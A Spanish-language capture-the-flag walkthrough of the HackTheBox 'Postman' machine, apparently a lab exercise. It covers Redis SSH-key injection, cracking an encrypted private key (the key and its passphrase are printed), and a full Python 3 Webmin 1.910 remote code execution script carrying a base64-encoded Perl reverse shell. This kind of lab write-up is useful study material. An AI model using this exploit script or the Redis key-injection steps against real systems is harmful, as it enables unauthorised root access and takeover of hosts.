# Resolución maquina PostMan

**Autor:** PepeMaquina
**Fecha:** 05 de Enero de 2026
**Dificultad:** Easy  
**Sistema Operativo:** Linux.
**Tags:** Redis, SSH, CVE.

---
## Imagen de la Máquina

![](postman.jpg)

*Imagen: Postman.JPG*
## Reconocimiento Inicial
### Escaneo de Puertos
Comenzamos con un escaneo completo de nmap para identificar servicios expuestos:
~~~ bash
sudo nmap -p- --open -sS -vvv --min-rate 5000 -n -Pn 10.129.2.1 -oG networked
~~~
Luego queda realizar un escaneo detallado de puertos abiertos:
~~~ bash
sudo nmap -sCV -p22,80,6379,10000 10.129.2.1 -oN targeted
~~~
### Enumeración de Servicios
~~~ 
PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 46:83:4f:f1:38:61:c0:1c:74:cb:b5:d1:4a:68:4d:77 (RSA)
|   256 2d:8d:27:d2:df:15:1a:31:53:05:fb:ff:f0:62:26:89 (ECDSA)
|_  256 ca:7c:82:aa:5a:d3:72:ca:8b:8a:38:3a:80:41:a0:45 (ED25519)
80/tcp    open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: The Cyber Geek's Personal Website
6379/tcp  open  redis   Redis key-value store 4.0.9
10000/tcp open  http    MiniServ 1.910 (Webmin httpd)
|_http-title: Site doesn't have a title (text/html; Charset=iso-8859-1).
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
~~~
Al realizar la enumeracion salta a primera vista un puerto que no es muy común como el 6379 "redis".
### Enumeración de la página web
Al revisar la pagina web no se encontró algo importante o util, parece que es un "rabbit hole" asi que por el momento lo dejare de lado.
### Enumeración Redis
Como se vio un puerto Redis, intentare ver que es posible con ello.
Primero se puede intentar conectarse si credenciales.
~~~bash
┌──(kali㉿kali)-[~/htb/postman/nmap]
└─$ redis-cli -h 10.129.2.1   
10.129.2.1:6379>
~~~
Si se pudo conectar, pero ahora es necesario obtener algo de información del servicio, asi que existen comandos como "info".
~~~bash
┌──(kali㉿kali)-[~/htb/postman/nmap]
└─$ redis-cli -h 10.129.2.1   
10.129.2.1:6379> info
# Server
redis_version:4.0.9
redis_git_sha1:00000000
redis_git_dirty:0
redis_build_id:9435c3c2879311f3
redis_mode:standalone
os:Linux 4.15.0-58-generic x86_64
arch_bits:64
multiplexing_api:epoll
atomicvar_api:atomic-builtin
gcc_version:7.4.0
process_id:671
run_id:a006748a4b18e4b930a20e88c99d2d8d292bf2ea
tcp_port:6379
uptime_in_seconds:2473
uptime_in_days:0
hz:10
lru_clock:6030368
executable:/usr/bin/redis-server
config_file:/etc/redis/redis.conf

# Clients
connected_clients:1
client_longest_output_list:0
client_biggest_input_buf:0
blocked_clients:0

# Memory
used_memory:841240
used_memory_human:821.52K
used_memory_rss:3768320
used_memory_rss_human:3.59M
used_memory_peak:841240
used_memory_peak_human:821.52K
used_memory_peak_perc:100.00%
used_memory_overhead:832086
used_memory_startup:782456
used_memory_dataset:9154
used_memory_dataset_perc:15.57%
total_system_memory:941203456
total_system_memory_human:897.60M
used_memory_lua:37888
used_memory_lua_human:37.00K
maxmemory:0
maxmemory_human:0B
maxmemory_policy:noeviction
mem_fragmentation_ratio:4.48
mem_allocator:jemalloc-3.6.0
active_defrag_running:0
lazyfree_pending_objects:0

# Persistence
loading:0
rdb_changes_since_last_save:0
rdb_bgsave_in_progress:0
rdb_last_save_time:1767635575
rdb_last_bgsave_status:ok
rdb_last_bgsave_time_sec:-1
rdb_current_bgsave_time_sec:-1
rdb_last_cow_size:0
aof_enabled:0
aof_rewrite_in_progress:0
aof_rewrite_scheduled:0
aof_last_rewrite_time_sec:-1
aof_current_rewrite_time_sec:-1
aof_last_bgrewrite_status:ok
aof_last_write_status:ok
aof_last_cow_size:0

# Stats
total_connections_received:4
total_commands_processed:4
instantaneous_ops_per_sec:0
total_net_input_bytes:86
total_net_output_bytes:15623
instantaneous_input_kbps:0.00
instantaneous_output_kbps:0.00
rejected_connections:0
sync_full:0
sync_partial_ok:0
sync_partial_err:0
expired_keys:0
expired_stale_perc:0.00
expired_time_cap_reached_count:0
evicted_keys:0
keyspace_hits:0
keyspace_misses:0
pubsub_channels:0
pubsub_patterns:0
latest_fork_usec:0
migrate_cached_sockets:0
slave_expires_tracked_keys:0
active_defrag_hits:0
active_defrag_misses:0
active_defrag_key_hits:0
active_defrag_key_misses:0

# Replication
role:master
connected_slaves:0
master_replid:9258143ee68fd51c98a6c07a5d72cb1cc585c376
master_replid2:0000000000000000000000000000000000000000
master_repl_offset:0
second_repl_offset:-1
repl_backlog_active:0
repl_backlog_size:1048576
repl_backlog_first_byte_offset:0
repl_backlog_histlen:0

# CPU
used_cpu_sys:2.22
used_cpu_user:0.87
used_cpu_sys_children:0.00
used_cpu_user_children:0.00

# Cluster
cluster_enabled:0

# Keyspace
~~~
Se puede ver información como la versión, pero lo mas importante que seria ver la base de datos que tiene, esto deberia reflejarse en el campo "keyspace", pero se ve vacio asi que probablemente no sea el camino adecuado.
La versión que utiliza es algo antigua, por ende existen diversas formas de explotarlo.
Siguiendo los articulos de la biblia hacktricks (https://book.hacktricks.wiki/en/network-services-pentesting/6379-pentesting-redis.html) para versiones anteriores a "5.0.5" se puede obtener un RCE (https://github.com/n0b0dyCN/redis-rogue-server).
Al intentar esto no surgio efecto, asi que se buscaron otras formas de entrar.

### Aprovechando vulnerabilidad SSH para Redis
Si redis tiene una configuracion incorrecta, existe un ataque donde se puede inyectar el id_rsa de mi maquina para poder ingresar al usuario redis sin necesidad de contraseñas.
Probando esto primero creo un nuevo id_rsa desde mi maquina.
~~~bash
┌──(kali㉿kali)-[~/htb/postman/exploits/redis-rogue-server]
└─$ ssh-keygen -t rsa

┌──(kali㉿kali)-[~/htb/postman/exploits/redis-rogue-server]
└─$ (echo -e "\n\n"; cat ~/id_rsa.pub; echo -e "\n\n") > spaced_key.txt 
                                                                                                                                                            
┌──(kali㉿kali)-[~/htb/postman/exploits/redis-rogue-server]
└─$ cat spaced_key.txt | redis-cli -h 10.129.2.1 -x set ssh_key
OK
~~~
Ahora dentro del servidor redis se debe pasar el id_rsa a su usuario que normalmente esta en "var/lib/redis".
~~~bash
10.129.2.1:6379[2]> config set dir /var/lib/redis/.ssh
OK
10.129.2.1:6379[2]> config set dbfilename "authorized_keys"
OK
10.129.2.1:6379[2]> save
OK
10.129.2.1:6379[2]> config set dir /var/lib/redis/.ssh
OK
10.129.2.1:6379[2]> config set dbfilename "authorized_keys"
OK
10.129.2.1:6379[2]> save
OK
~~~
Con ello configurado no se ve errores por ningun lado, asi que se procede ingresar por el id_rsa.
~~~bash
┌──(kali㉿kali)-[~/htb/postman/exploits/redis-rogue-server]
└─$ ssh -i /home/kali/.ssh/id_rsa redis@10.129.2.1 
Welcome to Ubuntu 18.04.3 LTS (GNU/Linux 4.15.0-58-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage


 * Canonical Livepatch is available for installation.
   - Reduce system reboots and improve kernel security. Activate at:
     https://ubuntu.com/livepatch
Last login: Mon Aug 26 03:04:25 2019 from 10.10.10.1
redis@Postman:~$
~~~
Efectivamente se pudo ingresar como el usuario Redis.
### Pivoting usuario Matt
Al ver los usuarios existentes se puede ver que "Matt" es el que tiene la user flag.
~~~bash
redis@Postman:~$ cat /etc/passwd | grep bash
root:x:0:0:root:/root:/bin/bash
Matt:x:1000:1000:,,,:/home/Matt:/bin/bash
redis:x:107:114::/var/lib/redis:/bin/bash
~~~
Pero el usuario actual no tiene permisos para ingresar a su carpeta de trabajo, pero se puede ver la carpeta ".bash_history" activa que normalmente no deberia de estar ahi. Asi que viendo su contenido.
~~~bash
redis@Postman:~$ ls -la
total 704
drwxr-x---  7 redis redis   4096 Jan  5 18:48 .
drwxr-xr-x 38 root  root    4096 Sep 29  2020 ..
drwxr-xr-x  2 root  root    4096 Oct 25  2019 6379
-rw-------  1 redis redis    399 Oct 25  2019 .bash_history
drwx------  2 redis redis   4096 Aug 25  2019 .cache
-rw-r-----  1 redis redis  46760 Aug 26  2019 dkixshbr.so
-rw-rw----  1 redis redis     92 Sep 29  2020 dump.rdb
-rw-r-----  1 redis redis  44320 Jan  5 18:48 exp.so
drwx------  3 redis redis   4096 Aug 25  2019 .gnupg
-rw-r-----  1 redis redis  46760 Aug 25  2019 ibortfgq.so
drwxrwxr-x  3 redis redis   4096 Aug 26  2019 .local
-rw-r-----  1 redis redis 440656 Aug 25  2019 module.o
-rw-r-----  1 redis redis  46760 Aug 25  2019 qcbxxlig.so
drwxr-xr-x  2 redis root    4096 Jan  5 19:02 .ssh
-rw-r-----  1 redis redis  46760 Aug 25  2019 vlpaulhk.so


redis@Postman:~$ cat .bash_history 
exit
su Matt
pwd
nano scan.py
python scan.py
nano scan.py
clear
nano scan.py
clear
python scan.py
exit
exit
cat /etc/ssh/sshd_config 
su Matt
clear
cd /var/lib/redis
su Matt
exit
cat id_rsa.bak 
ls -la
exit
cat id_rsa.bak 
exit
ls -la
crontab -l
systemctl enable redis-server
redis-server
ifconfig
netstat -a
netstat -a
netstat -a
netstat -a
netstat -a > txt
exit
crontab -l
cd ~/
ls
nano 6379
exit
~~~
Leyendo este contenido parece la configuracion de Redis, pero muestra un id_rsa que al parecer puede ser del usuario "Matt", asi que realice una busqueda general.
~~~bash
redis@Postman:~$ find / -name id_rsa.bak 2>/dev/null
/opt/id_rsa.bak
redis@Postman:~$ cat /opt/id_rsa.bak 
-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: DES-EDE3-CBC,73E9CEFBCCF5287C

JehA51I17rsCOOVqyWx+C8363IOBYXQ11Ddw/pr3L2A2NDtB7tvsXNyqKDghfQnX
cwGJJUD9kKJniJkJzrvF1WepvMNkj9ZItXQzYN8wbjlrku1bJq5xnJX9EUb5I7k2
7GsTwsMvKzXkkfEZQaXK/T50s3I4Cdcfbr1dXIyabXLLpZOiZEKvr4+KySjp4ou6
cdnCWhzkA/TwJpXG1WeOmMvtCZW1HCButYsNP6BDf78bQGmmlirqRmXfLB92JhT9
1u8JzHCJ1zZMG5vaUtvon0qgPx7xeIUO6LAFTozrN9MGWEqBEJ5zMVrrt3TGVkcv
EyvlWwks7R/gjxHyUwT+a5LCGGSjVD85LxYutgWxOUKbtWGBbU8yi7YsXlKCwwHP
UH7OfQz03VWy+K0aa8Qs+Eyw6X3wbWnue03ng/sLJnJ729zb3kuym8r+hU+9v6VY
Sj+QnjVTYjDfnT22jJBUHTV2yrKeAz6CXdFT+xIhxEAiv0m1ZkkyQkWpUiCzyuYK
t+MStwWtSt0VJ4U1Na2G3xGPjmrkmjwXvudKC0YN/OBoPPOTaBVD9i6fsoZ6pwnS
5Mi8BzrBhdO0wHaDcTYPc3B00CwqAV5MXmkAk2zKL0W2tdVYksKwxKCwGmWlpdke
P2JGlp9LWEerMfolbjTSOU5mDePfMQ3fwCO6MPBiqzrrFcPNJr7/McQECb5sf+O6
jKE3Jfn0UVE2QVdVK3oEL6DyaBf/W2d/3T7q10Ud7K+4Kd36gxMBf33Ea6+qx3Ge
SbJIhksw5TKhd505AiUH2Tn89qNGecVJEbjKeJ/vFZC5YIsQ+9sl89TmJHL74Y3i
l3YXDEsQjhZHxX5X/RU02D+AF07p3BSRjhD30cjj0uuWkKowpoo0Y0eblgmd7o2X
0VIWrskPK4I7IH5gbkrxVGb/9g/W2ua1C3Nncv3MNcf0nlI117BS/QwNtuTozG8p
S9k3li+rYr6f3ma/ULsUnKiZls8SpU+RsaosLGKZ6p2oIe8oRSmlOCsY0ICq7eRR
hkuzUuH9z/mBo2tQWh8qvToCSEjg8yNO9z8+LdoN1wQWMPaVwRBjIyxCPHFTJ3u+
Zxy0tIPwjCZvxUfYn/K4FVHavvA+b9lopnUCEAERpwIv8+tYofwGVpLVC0DrN58V
XTfB2X9sL1oB3hO4mJF0Z3yJ2KZEdYwHGuqNTFagN0gBcyNI2wsxZNzIK26vPrOD
b6Bc9UdiWCZqMKUx4aMTLhG5ROjgQGytWf/q7MGrO3cF25k1PEWNyZMqY4WYsZXi
WhQFHkFOINwVEOtHakZ/ToYaUQNtRT6pZyHgvjT0mTo0t3jUERsppj1pwbggCGmh
KTkmhK+MTaoy89Cg0Xw2J18Dm0o78p6UNrkSue1CsWjEfEIF3NAMEU2o+Ngq92Hm
npAFRetvwQ7xukk0rbb6mvF8gSqLQg7WpbZFytgS05TpPZPM0h8tRE8YRdJheWrQ
VcNyZH8OHYqES4g2UF62KpttqSwLiiF4utHq+/h5CQwsF+JRg88bnxh2z2BD6i5W
X+hK5HPpp6QnjZ8A5ERuUEGaZBEUvGJtPGHjZyLpkytMhTjaOrRNYw==
-----END RSA PRIVATE KEY-----

redis@Postman:~$ ls -la /opt/id_rsa.bak 
-rwxr-xr-x 1 Matt Matt 1743 Aug 26  2019 /opt/id_rsa.bak
~~~
Efectivamente existe un id_rsa.bak que pertenece al usuario Matt porque el es el propietario.
Pasando este contenido a mi maquina para ingresar.
~~~bash
┌──(kali㉿kali)-[~/htb/postman/content]
└─$ nano id_rsa

┌──(kali㉿kali)-[~/htb/postman/content]
└─$ chmod 600 id_rsa 

┌──(kali㉿kali)-[~/htb/postman/content]
└─$ ssh -i id_rsa matt@10.129.2.1
Enter passphrase for key 'id_rsa':
~~~
Esto pide una contraseña, asi que con ayuda de john obtengo el hash y descifro la contraseña.
~~~bash
┌──(kali㉿kali)-[~/htb/postman/content]
└─$ ssh2john id_rsa > hash_idrsa
                                                                                                                                                            
┌──(kali㉿kali)-[~/htb/postman/content]
└─$ sudo john hash_idrsa --wordlist=/usr/share/wordlists/rockyou.txt 
[sudo] password for kali: 
Using default input encoding: UTF-8
Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 1 for all loaded hashes
Cost 2 (iteration count) is 2 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
computer2008     (id_rsa)     
1g 0:00:00:00 DONE (2026-01-05 15:17) 5.555g/s 1371Kp/s 1371Kc/s 1371KC/s confused6..comett
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
~~~
Pero al intentar ingresar tampoco es posible.
~~~bash
┌──(kali㉿kali)-[~/htb/postman/content]
└─$ ssh -i id_rsa matt@10.129.2.1                                   
Enter passphrase for key 'id_rsa': 
Connection closed by 10.129.2.1 port 22
~~~
Por ende al revisar el archivo de configuración de ssh en el archivo "/etc/ssh/sshd_config" se ve un apartado donde indica que el usuario "Matt" no se puede conectar por ssh.
~~~bash
redis@Postman:~/6379$ cat /etc/ssh/sshd_config
#       $OpenBSD: sshd_config,v 1.101 2017/03/14 07:19:07 djm Exp $

# This is the sshd server system-wide configuration file.  See
........................
<SNIP>
........................
#deny users
DenyUsers Matt
........................
<SNIP>
........................
# no default banner path
#Banner none
~~~
Asi que desde el ssh de Redis cambio de usuario a Matt con las credenciales obtenidas.
~~~bash
redis@Postman:~$ su Matt
Password: 
Matt@Postman:/var/lib/redis$
~~~
Y si se obtuvo acceso al usuario Matt

---
## User Flag

> **Valor de la Flag:** `<Averiguelo usted mismo>`
### User Flag
Con acceso al usuario Matt, se puede ver que la user flag se encuentra en ese lugar.
~~~bash
Matt@Postman:/var/lib/redis$ cd
Matt@Postman:~$ ls
user.txt
Matt@Postman:~$ cat user.txt
<Encuentre su propia usre flag>
~~~

---
## Escalada de Privilegios
Revisando los archivos del usuario Matt tambien se puede ver que el historial de la bash no se encuentra vacio.
~~~bash
Matt@Postman:~$ ls -la
total 52
drwxr-xr-x 6 Matt Matt 4096 Sep 11  2019 .
drwxr-xr-x 3 root root 4096 Sep 11  2019 ..
-rw------- 1 Matt Matt 1676 Sep 11  2019 .bash_history
-rw-r--r-- 1 Matt Matt  220 Aug 25  2019 .bash_logout
-rw-r--r-- 1 Matt Matt 3771 Aug 25  2019 .bashrc
drwx------ 2 Matt Matt 4096 Aug 25  2019 .cache
drwx------ 3 Matt Matt 4096 Aug 25  2019 .gnupg
drwxrwxr-x 3 Matt Matt 4096 Aug 25  2019 .local
-rw-r--r-- 1 Matt Matt  807 Aug 25  2019 .profile
-rw-rw-r-- 1 Matt Matt   66 Aug 26  2019 .selected_editor
drwx------ 2 Matt Matt 4096 Aug 26  2019 .ssh
-rw-rw---- 1 Matt Matt   33 Jan  5 17:53 user.txt
-rw-rw-r-- 1 Matt Matt  181 Aug 25  2019 .wget-hsts

Matt@Postman:~$ cat .bash_history 
sudo -l
pwd
ls -la
wget https://gist.githubusercontent.com/fabiand/5628006/raw/fe02391084e634092681e3cbe5b7525545f83b84/SimpleHTTPPutServer.py
ls
python SimpleHTTPPutServer.py 8080
mv SimpleHTTPPutServer.py /var/www/html/SimpleHTTPPutServer.py
mv SimpleHTTPPutServer.py /var/www/html/
apt install apache2
su root
mv SimpleHTTPPutServer.py /var/www/html/
su root
cd /var/www/html
ls
python SimpleHTTPPutServer 8080
python -m SimpleHTTPPutServer 8080
service apache2 stop
rm index.html 
su root
exit
cd ..
crontab -e
reboot
exit
python -m SimpleHTTPPutServer 8080
python -m SimpleHTTPServer 8080
ls
chmod 700 flag.txt
python server.py 8080
python server.py 127.0.0.1 8080
python server.py 127.0.0.1:8080
mkdir server
mv server server/
ls
mv server.py server/
cd server
ls
cp ../.ssh/id_rsa id_rsa.bak
ls
cd ..
ls
ls -la
passwd
nano server/server.py 
python3 server/server.py 
nano server/server.py 
ssh-keygen
openssl genrsa -des3 -out private.pem 2048
ls
cat private.pem
mv private.pem server/id_rsa.bak
ls
cd server
ls
python3 server.py 
python server.py 
python server.py 127.0.0.1:8080
su root
ls
nano server.py import sys
nano server.py
python server.py 8080
python server.py 127.0.0.1:8080
ls
service redis restart
su root
ls
echo 'Well Done' > flag.txt
su root
ls
chmod u+s base64
ls -la
crontab -e
exit
cd ~/
ls
cd server
ls
nano reminder
nano justincase.txt
exit
crontab -l
crontab -e
reboot
exit
cd ~/
nano user.txt
rm flag.txt 
clear
cd /var/lib/redis
exit
cd ~/
cat user.txt
exit
cd ~/server/
ls
nano justincase.txt 
python server.py
python server.py 127.0.0.1:8080
su root
crontab -l
crontab -r
crontab -l
clear
exit
cd /home/Matt
ls -la
cat user.txt
su redis
exit
~~~
Esto no me dice mucho, pero realizando enumeración manual puedo ver que el puerto 10000 que se encontro al principio corre "webmin".

![](postman2.jpg)

### Aprovechando permisos Web como Root
Al seguir realizando mas enumeración manual se pudo observar que el servidor web esta corriendo con permisos root. Asi que es algo a tomar en cuenta
~~~bash
Matt@Postman:~$ netstat -lnpt
(No info could be read for "-p": geteuid()=1000 but you should be root.)
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
tcp        0      0 0.0.0.0:6379            0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:10000           0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
tcp6       0      0 ::1:6379                :::*                    LISTEN      -                   
tcp6       0      0 :::80                   :::*                    LISTEN      -                   
tcp6       0      0 :::22                   :::*                    LISTEN      -  

Matt@Postman:/usr/share/webmin$ ps aux | grep root
root        362  0.0  0.6 170344  5780 ?        Ssl  17:52   0:00 /usr/bin/python3 /usr/bin/networkd-dispatcher --run-startup-triggers
root        450  0.0  0.0      0     0 ?        I<   17:52   0:00 [ttm_swap]
root        452  0.0  0.0      0     0 ?        S    17:52   0:00 [irq/16-vmwgfx]
root        559  0.0  0.1  25992  1304 ?        Ss   17:52   0:00 /sbin/dhclient -1 -4 -v -pf /run/dhclient.ens33.pid -lf /var/lib/dhcp/dhclient.ens33.leases -I -df /var/lib/dhcp/dhclient6.ens33.leases ens33
root        648  0.0  0.0  16180   132 tty1     Ss+  17:52   0:00 /sbin/agetty -o -p -- \u --noclear tty1 linux
root        656  0.0  0.0  72296   864 ?        Ss   17:52   0:00 /usr/sbin/sshd -D
root        697  0.0  0.6 331332  5680 ?        Ss   17:52   0:00 /usr/sbin/apache2 -k start
root        777  0.0  2.9  95288 27220 ?        Ss   17:52   0:00 /usr/bin/perl /usr/share/webmin/miniserv.pl /etc/webmin/miniserv.conf
~~~
Lo malo es que no se tiene credenciales para ingresar, entonces colocando las credenciales de Matt (Matt:computer2008) si se obtuvo acceso al dashboard de la pagina.

![](postman3.jpg)

Tambien se puede ver la versión que corre, por ende una busqueda rapida en internet me mostro un RCE con dicha version de Webmin. (https://github.com/roughiz/Webmin-1.910-Exploit-Script)
Lastimosamente el script corre en python2, por ende le dije a la IA que adapte el script para python3.
~~~python
#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import requests
import urllib3
import argparse
import sys
import base64
from termcolor import colored

urllib3.disable_warnings()

arg_parser = argparse.ArgumentParser(
    description='Webmin 1.910 - Remote Code Execution exploit (Python 3)'
)

arg_parser.add_argument('--rhost', required=True, help='IP address of the Webmin server')
arg_parser.add_argument('--rport', type=int, default=10000, help='Target Webmin port (default: 10000)')
arg_parser.add_argument('--lhost', required=True, help='Local IP address for reverse shell')
arg_parser.add_argument('--lport', type=int, default=4444, help='Local port for reverse shell')
arg_parser.add_argument('-u', '--user', default='admin', help='Username (default: admin)')
arg_parser.add_argument('-p', '--password', required=True, help='Password')
arg_parser.add_argument('-t', '--TARGETURI', dest='targeturi', default='/', help='Base path (default: /)')
arg_parser.add_argument('-s', '--SSL', dest='ssl', default='False', help='Use SSL (True/False)')

args = arg_parser.parse_args()

print(colored('****************************** Webmin 1.910 Exploit *******************************', 'blue'))
print(colored('****************************** Retrieve Cookies sid ********************************', 'blue'))

# URL
if args.ssl.lower() in ('yes', 'true', 't', 'y', '1'):
    url = f"https://{args.rhost}:{args.rport}{args.targeturi}"
else:
    url = f"http://{args.rhost}:{args.rport}{args.targeturi}"

# Login request
login_data = {
    'page': '',
    'user': args.user,
    'pass': args.password
}

resu = requests.post(
    url + "session_login.cgi",
    data=login_data,
    cookies={"testing": "1"},
    verify=False,
    allow_redirects=False
)

content = resu.content.decode(errors='ignore')

if "This web server is running in SSL mode" in content:
    print(colored('[ERROR] Enable SSL option!', 'red'))
    sys.exit(1)

if 'Set-Cookie' in resu.headers and 'sid' in resu.headers['Set-Cookie']:
    sid = resu.headers['Set-Cookie'].split('sid=')[1].split(';')[0]
    print(colored(f'[+] Cookie SID obtained: {sid}', 'green'))
else:
    print(colored('[ERROR] Authentication failed', 'red'))
    sys.exit(1)

print(colored('****************************** Sending Payload ************************************', 'blue'))

# Perl reverse shell payload
template = (
    "perl -MIO -e '$p=fork;exit,if($p);"
    "foreach my $key(keys %ENV){if($ENV{$key}=~/(.*)/){$ENV{$key}=$1;}}"
    f"$c=new IO::Socket::INET(PeerAddr,\"{args.lhost}:{args.lport}\");"
    "STDIN->fdopen($c,r);$~->fdopen($c,w);"
    "while(<>){if($_=~ /(.*)/){system $1;}};'"
)

# Base64 encode (Python 3 way)
b64payload = base64.b64encode(template.encode()).decode().replace('\n', '')

payload = f' | bash -c "{{echo,{b64payload}}}|{{base64,-d}}|{{bash,-i}}"'

exploit_data = {'u': ['acl/apt', payload]}

headers = {
    'Connection': 'close',
    'Referer': url + "package-updates/?xnavigation=1"
}

try:
    requests.post(
        url + "package-updates/update.cgi",
        data=exploit_data,
        cookies={"sid": sid},
        verify=False,
        allow_redirects=False,
        headers=headers,
        timeout=10
    )
except requests.RequestException:
    pass

print(colored(f'[+] Check your listener on port {args.lport}', 'green'))
~~~
Con el script adaptado, solo fue cosa de ejecutarla.
~~~bash
┌──(kali㉿kali)-[~/htb/postman/exploits]
└─$ python3 webmin_exploit_python3.py --rhost 10.129.2.1 --lhost 10.10.15.165 --rport 10000 -p computer2008 -u Matt -s True --lport 4433
****************************** Webmin 1.910 Exploit *******************************
****************************** Retrieve Cookies sid ********************************
[+] Cookie SID obtained: a0387e95d090b7909f0a5caaf4a2c185
****************************** Sending Payload ************************************
[+] Check your listener on port 4433
~~~
Antes de correrlo se abrio un escucha con el puerto 4433 con penelope.
~~~bash
──(kali㉿kali)-[~/htb/postman/exploits]
└─$ penelope -p 4433                                                                                                           
[+] Listening for reverse shells on 0.0.0.0:4433 →  127.0.0.1 • 192.168.5.128 • 172.18.0.1 • 172.17.0.1 • 10.10.15.165
➤  🏠 Main Menu (m) 💀 Payloads (p) 🔄 Clear (Ctrl-L) 🚫 Quit (q/Ctrl-C)
[+] Got reverse shell from Postman~10.129.2.1-Linux-x86_64 😍 Assigned SessionID <1>
[+] Attempting to upgrade shell to PTY...
[+] Shell upgraded successfully using /usr/bin/python3! 💪
[+] Interacting with session [1], Shell Type: PTY, Menu key: F12 
[+] Logging to /home/kali/.penelope/sessions/Postman~10.129.2.1-Linux-x86_64/2026_01_05-16_09_18-237.log 📜
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
root@Postman:/usr/share/webmin/package-updates/# id
uid=0(root) gid=0(root) groups=0(root)
~~~
Y efectivamente se obtuvo acceso como root

---
## Root Flag

> **Valor de la Flag:** `<Averiguelo usted mismo>`

Con acceso como usuario root ya se puede leer la root flag y realizar cualquier accion que requiera.
~~~bash
root@Postman:/usr/share/webmin/package-updates/# cd /root/
root@Postman:~# ls
redis-5.0.0  root.txt
root@Postman:~# ls -la
total 76
drwx------  8 root root  4096 Jan  5 17:53 .
drwxr-xr-x 22 root root  4096 Aug 25  2019 ..
-rw-------  1 root root 14686 Jan  5 21:09 .bash_history
-rw-r--r--  1 root root  3106 Apr  9  2018 .bashrc
drwx------  2 root root  4096 Aug 24  2019 .cache
drwx------  3 root root  4096 Aug 26  2019 .gnupg
-rw-------  1 root root    28 Oct 25  2019 .lesshst
drwxr-xr-x  3 root root  4096 Aug 24  2019 .local
-rw-r--r--  1 root root   148 Aug 17  2015 .profile
-rw-------  1 root root    79 Aug 25  2019 .rediscli_history
-rw-r--r--  1 root root    66 Oct 25  2019 .selected_editor
drwx------  2 root root  4096 Aug 25  2019 .ssh
drwxr-xr-x  2 root root  4096 Aug 25  2019 .tmp
-rw-------  1 root root  3449 Sep 29  2020 .viminfo
drwxrwxr-x  6 root root  4096 Oct  2  2019 redis-5.0.0
-rw-r--r--  1 root root    33 Jan  5 17:53 root.txt
root@Postman:~# cat root.txt 
<Encuentre su propia root flag>
~~~
De esa forma, se logro obtener la root flag.
🎉 Sistema completamente comprometido - Root obtenido
